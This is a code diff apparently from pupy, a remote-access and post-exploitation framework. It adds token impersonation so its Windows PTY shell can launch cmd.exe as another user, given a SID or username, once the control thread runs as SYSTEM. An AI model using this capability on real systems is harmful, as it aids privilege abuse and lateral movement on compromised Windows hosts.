@@ -8,20 +8,25 @@ import winpty
 from collections import deque
 from pupy import manager, Task
 
+from pupwinutils.security import (
+    sidbyname, getSidToken, get_thread_token,
+    token_impersonated_as_system
+)
+
 class PtyShell(Task):
     __slots__ = (
-        'pty', 'argv', 'term', 'suid',
+        'pty', 'argv', 'term', 'htoken',
         'read_cb', 'close_cb', '_buffer'
     )
 
-    def __init__(self, manager, argv=None, term=None, suid=None):
+    def __init__(self, manager, argv=None, term=None, htoken=None):
         super(PtyShell, self).__init__(manager)
 
         self.pty = None
 
         self.argv = argv
         self.term = term
-        self.suid = suid
+        self.htoken = htoken
 
         self.read_cb = None
         self.close_cb = None
@@ -62,7 +67,8 @@ class PtyShell(Task):
             argv = r'C:\windows\system32\cmd.exe'
 
         try:
-            self.pty = winpty.WinPTY(argv)
+            self.pty = winpty.WinPTY(
+                argv, htoken=self.htoken)
 
             if self.pty:
                 self._read_loop()
@@ -107,9 +113,32 @@ def acquire(argv=None, term=None, suid=None):
 
     new = False
     if not (shell and shell.active):
+        htoken = None
+
+        if suid:
+            sid = None
+            if suid.startswith('S-1-'):
+                sid = suid
+            else:
+                sid = sidbyname(suid)
+                if not sid:
+                    raise ValueError(
+                        'Unknown username {}'.format(
+                            suid.encode('utf-8')))
+
+            hSidToken = getSidToken(sid)
+            if hSidToken is None:
+                raise ValueError("Couldn't impersonate sid {}".format(sid))
+
+            hCurrentToken = get_thread_token()
+            if not token_impersonated_as_system(hCurrentToken):
+                raise ValueError('Impersonate control thread as SYSTEM first')
+
+            htoken = (hCurrentToken, hSidToken)
+
         shell = manager.create(
             PtyShell,
-            argv, term, suid)
+            argv, term, htoken)
 
         new = True
 
